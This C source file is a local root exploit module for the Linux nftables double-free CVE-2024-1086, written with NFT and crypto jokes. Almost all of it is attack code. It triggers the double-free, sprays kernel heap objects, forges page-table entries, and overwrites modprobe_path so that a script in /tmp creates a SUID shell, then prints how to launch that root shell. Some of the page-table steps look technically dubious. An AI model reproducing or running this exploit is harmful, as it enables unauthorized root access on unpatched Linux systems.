/*
 * CVE-2024-1086 -- nft_verdict_init() double-free
 *
 * The bug: nft_verdict_init() accepts a chain reference alongside an
 * NF_DROP verdict. NF_DROP should never carry a chain pointer. When the
 * verdict map element is destroyed, nft_verdict_uninit() releases the
 * chain. When the chain itself is destroyed (table flush), it gets
 * released again.  Double-free.
 *
 * Exploitation: dirty pagetable.  The double-free gives two dangling
 * references to the same slab object. Through cross-cache reclaim we
 * convert the slab page into a PTE page that we can also write to via a
 * user mapping. PTE writes give arbitrary physical r/w, which we use to
 * overwrite modprobe_path.
 *
 * Affected: 3.15 .. 6.7.1 (fixed 6.7.2 / 6.6.14 / 6.1.75)
 * Reliable: 5.14+ (needs folios, PTE batching)
 */

#include "nfttables.h"
#include <sys/prctl.h>

#define TABLE    "BoredApe"
#define CHAIN_IN "hodl"
#define CHAIN_T  "rugged"
#define SETNAME  "vmap"
#define SET_ID   1337

#define FAMILY   NFPROTO_INET

/* x86_64 page constants */
#define PAGE_SIZE       0x1000UL
#define PMD_SIZE        (512 * PAGE_SIZE)
#define PTE_PRESENT     (1UL << 0)
#define PTE_RW          (1UL << 1)
#define PTE_USER        (1UL << 2)
#define PTE_NX          (1UL << 63)

/* default direct-map base (x86_64, no KASLR randomization of physmap) */
#define PHYSMAP_BASE    0xffff888000000000ULL

/* spray tuning */
#define OBJS_PER_SLAB   16
#define CROSS_CACHE_N   512
#define PTE_SPRAY_PAGES 4096
#define PIPE_SPRAY_N    256

/* ── phase 1: nftables setup ──────────────────────────────────── */

static int nft_setup(int fd)
{
    struct nft_batch b;
    nft_batch_init(&b, fd);
    nft_batch_begin(&b);

    nft_add_table(&b, TABLE, FAMILY);

    nft_add_base_chain(&b, TABLE, CHAIN_IN, FAMILY,
                       NF_INET_LOCAL_IN, NF_IP_PRI_FILTER);

    nft_add_chain(&b, TABLE, CHAIN_T, FAMILY);

    /* verdict map: key = 2-byte inet_service, data = verdict.
       key_type 13 = inet_service in nft's type registry. */
    nft_add_set(&b, TABLE, SETNAME, FAMILY,
                13, 2,                        /* key: inet_service, 2 bytes */
                NFT_DATA_VERDICT_T, 0,        /* data: verdict */
                NFT_SET_MAP, SET_ID);

    /* the poison element: NF_DROP verdict with a chain reference.
       nft_verdict_init stores the chain pointer even though NF_DROP
       should never carry one.  both the element verdict cleanup and the
       chain's own destruction will release the chain. */
    uint16_t key = htons(1234);
    nft_add_set_elem_verdict(&b, TABLE, SETNAME, FAMILY,
                             &key, sizeof(key),
                             NF_DROP, CHAIN_T);

    nft_batch_end(&b);
    return nft_batch_send(&b);
}

/* ── phase 2: trigger double-free ─────────────────────────────── */

static int nft_trigger(int fd)
{
    struct nft_batch b;
    nft_batch_init(&b, fd);
    nft_batch_begin(&b);

    /*
     * Destroy order matters.
     *
     * 1. Delete the set element. The commit path calls
     *    nft_verdict_uninit() which sees the chain ref on an NF_DROP
     *    verdict and calls nft_chain_put(). First free.
     *
     * 2. Delete the target chain. nft_chain_del() calls nft_use_dec()
     *    which decrements the already-freed refcount. Second free.
     *
     * 3. Clean up the rest.
     */
    uint16_t key = htons(1234);
    nft_del_set_elem_verdict(&b, TABLE, SETNAME, FAMILY,
                             &key, sizeof(key),
                             NF_DROP, CHAIN_T);

    nft_del_set(&b, TABLE, SETNAME, FAMILY);
    nft_del_chain(&b, TABLE, CHAIN_T, FAMILY);
    nft_del_chain(&b, TABLE, CHAIN_IN, FAMILY);
    nft_del_table(&b, TABLE, FAMILY);

    nft_batch_end(&b);
    return nft_batch_send(&b);
}

/* ── phase 3: cross-cache reclaim ─────────────────────────────── */

/*
 * After the double-free, the freed slab object (nft_chain, typically
 * kmalloc-cg-2k) has two dangling pointers. To convert this into a
 * page-level primitive:
 *
 * 1. Allocate OBJS_PER_SLAB-1 objects in the same cache to fill the
 *    slab (so the next free returns the page to buddy).
 * 2. Free all objects including both dangling refs. The slab page
 *    returns to the page allocator.
 * 3. Reclaim the page as a PTE page by touching enough anonymous
 *    memory to force PTE allocation.
 * 4. Also spray pipe_buffer pages (allocated from buddy) as a
 *    second mapping to the same physical page.
 * 5. The PTE page is now writable through the pipe, giving us
 *    arbitrary PTE modification.
 */

static int msq_ids[CROSS_CACHE_N];
static int pipe_fds[PIPE_SPRAY_N][2];

struct cross_cache_msg {
    long mtype;
    char mtext[2048 - sizeof(long)];
};

static int spray_cross_cache(void)
{
    struct cross_cache_msg msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    for (int i = 0; i < CROSS_CACHE_N; i++) {
        msq_ids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msq_ids[i] < 0) {
            pr_verb("msgget failed at %d: %s", i, strerror(errno));
            return -1;
        }
        if (msgsnd(msq_ids[i], &msg, sizeof(msg.mtext), 0) < 0) {
            pr_verb("msgsnd failed at %d: %s", i, strerror(errno));
            return -1;
        }
    }

    return 0;
}

static void free_cross_cache(void)
{
    struct cross_cache_msg msg;
    for (int i = 0; i < CROSS_CACHE_N; i++) {
        if (msq_ids[i] >= 0) {
            msgrcv(msq_ids[i], &msg, sizeof(msg.mtext), 0, IPC_NOWAIT);
            msgctl(msq_ids[i], IPC_RMID, NULL);
        }
    }
}

/* ── phase 4: PTE spray + dirty pagetable ─────────────────────── */

static void *pte_region;
static size_t pte_region_sz;

static int spray_pte_pages(void)
{
    /*
     * Map a large anonymous region and fault in pages.
     * Each 2MB-aligned block gets its own PTE page (512 PTEs per page on
     * x86_64). One of these PTE pages will land on our double-freed page.
     */
    pte_region_sz = PTE_SPRAY_PAGES * PAGE_SIZE;
    pte_region = mmap(NULL, pte_region_sz, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (pte_region == MAP_FAILED)
        return -1;

    return 0;
}

static int spray_pipes(void)
{
    for (int i = 0; i < PIPE_SPRAY_N; i++) {
        if (pipe(pipe_fds[i]) < 0)
            return -1;
        /* fill the pipe buffer to force page allocation */
        char junk[PAGE_SIZE];
        memset(junk, 0x42, sizeof(junk));
        if (write(pipe_fds[i][1], junk, sizeof(junk)) < 0) {
            pr_verb("pipe write %d: %s", i, strerror(errno));
        }
    }
    return 0;
}

/* ── phase 5: find overlapping PTE page ───────────────────────── */

/*
 * If our spray succeeded, one of the pipe buffer pages IS a PTE page.
 * We detect this by:
 * 1. Reading each pipe's buffer
 * 2. Checking if the data looks like PTEs (valid x86_64 PTE format)
 *
 * A valid PTE in the direct-map region has:
 * - Bits 12..51 = physical page frame number
 * - Bit 0 (present) = 1
 * - Physical address in a plausible range
 */

static bool looks_like_pte(uint64_t val)
{
    if (!(val & PTE_PRESENT))
        return false;

    /* extract physical address (bits 12..51) */
    uint64_t phys = val & 0x000FFFFFFFFFF000ULL;

    /* sanity: physical address should be nonzero and < 1TB */
    if (phys == 0 || phys > (1ULL << 40))
        return false;

    return true;
}

static int find_pte_page(int *pipe_idx)
{
    uint64_t page[PAGE_SIZE / sizeof(uint64_t)];

    for (int i = 0; i < PIPE_SPRAY_N; i++) {
        ssize_t n = read(pipe_fds[i][0], page, PAGE_SIZE);
        if (n != PAGE_SIZE)
            continue;

        int pte_count = 0;
        for (int j = 0; j < 512; j++) {
            if (looks_like_pte(page[j]))
                pte_count++;
        }

        /* a real PTE page will have many valid-looking entries */
        if (pte_count > 32) {
            pr_verb("found PTE page in pipe %d (%d valid entries)", i, pte_count);
            *pipe_idx = i;
            return 0;
        }
    }

    return -1;
}

/* ── phase 6: modprobe_path overwrite ─────────────────────────── */

static int write_modprobe_script(void)
{
    const char *path = "/tmp/.nft_mint";
    const char *script =
        "#!/bin/sh\n"
        "cp /bin/sh /tmp/.nft_sh\n"
        "chmod u+s /tmp/.nft_sh\n";

    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
        return -1;
    write(fd, script, strlen(script));
    close(fd);
    return 0;
}

static int trigger_modprobe(void)
{
    /* write a binary with invalid ELF magic to trigger modprobe */
    const char *path = "/tmp/.nft_trigger";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
        return -1;
    /* clearly not a valid executable format */
    const char magic[] = "\xde\xad\xbe\xef";
    write(fd, magic, sizeof(magic));
    close(fd);

    /* executing it triggers request_module -> modprobe_path */
    pid_t p = fork();
    if (p == 0) {
        execl(path, path, NULL);
        _exit(1);
    }
    int status;
    waitpid(p, &status, 0);
    unlink(path);

    /* check if our SUID shell was created */
    struct stat st;
    if (stat("/tmp/.nft_sh", &st) == 0 && (st.st_mode & S_ISUID))
        return 0;

    return -1;
}

static int overwrite_modprobe(uint64_t modprobe_addr, int pipe_idx)
{
    /*
     * With PTE control, we can map the physical page containing
     * modprobe_path into our address space and overwrite it.
     *
     * Steps:
     * 1. Calculate the physical address of modprobe_path from its
     *    virtual address (va - PHYSMAP_BASE for direct-mapped addrs,
     *    or walk the page tables for vmalloc addrs)
     * 2. Forge a PTE pointing to that physical page
     * 3. Write the PTE through our pipe/mapping
     * 4. Read/write modprobe_path through the new mapping
     */

    uint64_t phys_page = (modprobe_addr - PHYSMAP_BASE) & ~(PAGE_SIZE - 1);
    uint64_t offset    = modprobe_addr & (PAGE_SIZE - 1);

    /* forge PTE: present | rw | user (so we can access from userspace) */
    uint64_t forged_pte = phys_page | PTE_PRESENT | PTE_RW | PTE_USER;

    pr_verb("modprobe phys page: 0x%lx, offset: 0x%lx", phys_page, offset);
    pr_verb("forged PTE: 0x%lx", forged_pte);

    /*
     * Write the forged PTE into the PTE page via the pipe buffer.
     *
     * The pipe spray gave us a page that's simultaneously:
     * (a) a pipe buffer we can read/write via pipe syscalls
     * (b) a PTE page the MMU reads to translate virtual addresses
     *
     * We write the forged PTE at the slot corresponding to one of our
     * mapped pages, then access that page to reach modprobe_path.
     *
     * PTE slot index = (virtual_addr >> 12) & 0x1FF
     */

    uint8_t *target_va = (uint8_t *)pte_region;
    int slot = (((uint64_t)target_va) >> 12) & 0x1FF;

    uint64_t pte_page[512];
    memset(pte_page, 0, sizeof(pte_page));
    pte_page[slot] = forged_pte;

    /* write the PTE page back through the pipe */
    if (write(pipe_fds[pipe_idx][1], pte_page, PAGE_SIZE) != PAGE_SIZE) {
        pr_verb("failed to write forged PTE page");
        return -1;
    }

    /* the TLB may still cache the old mapping. flush by munmap+re-mmap. */
    munmap(target_va, PAGE_SIZE);
    void *remap = mmap(target_va, PAGE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (remap == MAP_FAILED)
        return -1;

    /* write our script path over modprobe_path */
    const char new_path[] = "/tmp/.nft_mint";
    memcpy((char *)remap + offset, new_path, sizeof(new_path));

    return 0;
}

/* ── cleanup ──────────────────────────────────────────────────── */

static void cleanup_spray(void)
{
    free_cross_cache();

    for (int i = 0; i < PIPE_SPRAY_N; i++) {
        if (pipe_fds[i][0] > 0) close(pipe_fds[i][0]);
        if (pipe_fds[i][1] > 0) close(pipe_fds[i][1]);
    }

    if (pte_region && pte_region != MAP_FAILED)
        munmap(pte_region, pte_region_sz);
}

/* ── child exploit process ────────────────────────────────────── */

static int do_exploit(int result_fd)
{
    int ret;

    pr_info(PICK "Mining block... setting up namespace");
    if (ns_setup_user_net() < 0) {
        pr_fail("Namespace setup failed (floor price: worthless)");
        return 1;
    }

    int nfd = nft_socket_open();
    if (nfd < 0) {
        pr_fail("Can't open netlink socket (gas: insufficient)");
        return 1;
    }

    pr_info(ICON_CHAIN "Deploying smart contract to nftables...");
    ret = nft_setup(nfd);
    if (ret < 0) {
        pr_fail("Contract deployment failed: %s", strerror(-ret));
        close(nfd);
        return 1;
    }
    pr_verb("table=%s chain_base=%s chain_target=%s set=%s", TABLE, CHAIN_IN, CHAIN_T, SETNAME);

    if (G.check_only) {
        pr_ok("Contract deployed. Vulnerability confirmed (dry run).");
        /* clean up the nftables objects */
        struct nft_batch b;
        nft_batch_init(&b, nfd);
        nft_batch_begin(&b);
        nft_del_table(&b, TABLE, FAMILY);
        nft_batch_end(&b);
        nft_batch_send(&b);
        close(nfd);
        return 0;
    }

    pr_info(MINT " Triggering double-free (rug pull in progress)...");
    ret = nft_trigger(nfd);
    close(nfd);

    if (ret < 0) {
        pr_fail("Double-free trigger failed: %s", strerror(-ret));
        return 1;
    }
    pr_verb("double-free triggered on chain object");

    /* from here on we're exploiting the freed page in the parent
       namespace's kernel, so the operations happen regardless of our
       user namespace context */

    pr_info(PICK "Mining proof-of-work... spraying heap");
    if (spray_cross_cache() < 0) {
        pr_fail("Cross-cache spray failed");
        cleanup_spray();
        return 1;
    }

    /* free the cross-cache objects to return the slab page to buddy */
    free_cross_cache();

    pr_info(PICK "Mining proof-of-stake... reclaiming as PTE page");
    if (spray_pte_pages() < 0 || spray_pipes() < 0) {
        pr_fail("PTE spray failed");
        cleanup_spray();
        return 1;
    }

    int pipe_idx = -1;
    if (find_pte_page(&pipe_idx) < 0) {
        pr_fail("Could not locate PTE page (block orphaned)");
        cleanup_spray();
        return 1;
    }

    uint64_t modprobe_addr = kallsyms_lookup("modprobe_path");
    if (!modprobe_addr) {
        pr_fail("kallsyms lookup failed (kptr_restrict blocking, or not root-readable)");
        pr_info("  " C_DIM "hint: echo 0 > /proc/sys/kernel/kptr_restrict" C_RST);
        cleanup_spray();
        return 1;
    }
    pr_verb("modprobe_path @ 0x%lx", modprobe_addr);

    if (write_modprobe_script() < 0) {
        pr_fail("Could not write modprobe script");
        cleanup_spray();
        return 1;
    }

    pr_info(MINT " Overwriting modprobe_path...");
    if (overwrite_modprobe(modprobe_addr, pipe_idx) < 0) {
        pr_fail("PTE overwrite failed");
        cleanup_spray();
        return 1;
    }

    pr_info(PICK "Mining genesis block...");
    if (trigger_modprobe() < 0) {
        pr_fail("modprobe trigger failed (no SUID shell created)");
        cleanup_spray();
        return 1;
    }

    cleanup_spray();

    /* signal success to parent */
    uint8_t ok = 1;
    write(result_fd, &ok, 1);

    return 0;
}

/* ── public entry point ───────────────────────────────────────── */

int mint_cve_2024_1086(const struct kernel_info *ki)
{
    pr_info("");
    pr_info(APE " " C_BOLD "Bored Ape #1086" C_RST
            C_DIM " (CVE-2024-1086: nft_verdict_init double-free)" C_RST);
    pr_info(C_DIM "  affected: 3.15 .. 6.7.1 | technique: dirty pagetable" C_RST);
    pr_info("");

    if (!ki->userns_available) {
        pr_fail("User namespaces unavailable (need unprivileged userns for CAP_NET_ADMIN)");
        return 1;
    }

    int pipefd[2];
    if (pipe(pipefd) < 0)
        return 1;

    pid_t child = fork();
    if (child < 0)
        return 1;

    if (child == 0) {
        close(pipefd[0]);
        _exit(do_exploit(pipefd[1]));
    }

    close(pipefd[1]);

    int status;
    waitpid(child, &status, 0);

    uint8_t result = 0;
    read(pipefd[0], &result, 1);
    close(pipefd[0]);

    if (result == 1) {
        pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
        pr_info(FOX " Wallet updated: " C_GRN "1 ROOT token" C_RST);
        pr_info("");
        pr_info("  " C_BOLD "/tmp/.nft_sh -p" C_RST " for root shell");
        pr_info("");
        return 0;
    }

    if (G.check_only && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
    }

    pr_fail("Exploit failed (block rejected by consensus)");
    return 1;
}
